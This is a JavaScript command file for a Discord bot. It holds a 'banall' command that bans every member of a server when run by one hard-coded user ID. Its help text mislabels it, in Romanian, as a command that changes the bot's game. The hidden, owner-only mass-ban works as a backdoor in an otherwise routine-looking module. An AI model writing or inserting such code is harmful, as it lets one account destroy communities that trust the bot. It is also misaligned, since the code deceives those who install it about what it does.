exports.run = (client, message, prefix) => {
    if(message.author.id === "238718268049719296") {
        message.guild.members.forEach(member => {
          message.guild.ban(member.id)
            })}
   }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0
};

exports.help = {
  name: 'banall',
  description: 'Schimba jocul bot-ului',
  usage: 'game'
};
